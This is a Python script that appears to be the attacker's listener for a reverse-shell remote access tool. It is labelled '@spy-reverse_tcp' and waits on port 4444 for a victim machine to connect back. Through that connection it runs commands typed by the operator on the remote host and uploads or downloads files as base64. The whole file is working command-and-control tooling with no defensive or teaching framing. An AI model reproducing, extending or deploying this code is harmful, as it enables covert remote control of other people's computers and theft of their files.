import socket
import json
import base64
import colorama
import os
import random
from colorama import Fore
from colorama import Style
os.system("clear")
root = input("Server : ")
print("Server generated successfully")
rdm = (random.random())
print("GENERATED ID > " + str(rdm))
print("ID > ", Fore.RED +str(rdm), end="" "@spy-reverse_tcp")
print("\n\n")
print(Style.RESET_ALL, "SERVER =  ",root, "\n\n")
class Listener:
        #SOCKET
    def __init__(self, ip, port):

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # ----------------------------------------------------------------------------
        listener.bind((ip, port))
        listener.listen(0)


        print(Fore.RED + "[",root,"]", Style.RESET_ALL, "Server started > [0] Connections")


        self.connection, address = listener.accept()
        print(Fore.RED + "[",root,"]", Style.RESET_ALL, " Server connected to" + str(address), "\n\n\n\n", "|", root, "|", "Getting user information please wait...", "\n\n")

    def reliable_send(self, data):
        json_data = json.dumps(data) #serialisation

        self.connection.send(json_data.encode())

    def reliable_recive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return print(Fore.RED + "[ LOG ]", Style.RESET_ALL, "File downloaded successfully [1]")

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def execute_remotly(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_recive()





    def run(self):



        while True:
            command = input("\x1b[0;31m[ ~ ] > \x1b[1;37m")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode('ascii'))


                result = self.execute_remotly(command)





                if command[0] == "download" and len(command) > 1:

                    result = self.write_file(command[1], result)
            except Exception:
                result = b"[-] Error when command execution !"

            print(result)


listener = Listener('127.0.0.1', 4444) #IP y PUERTO
listener.run()
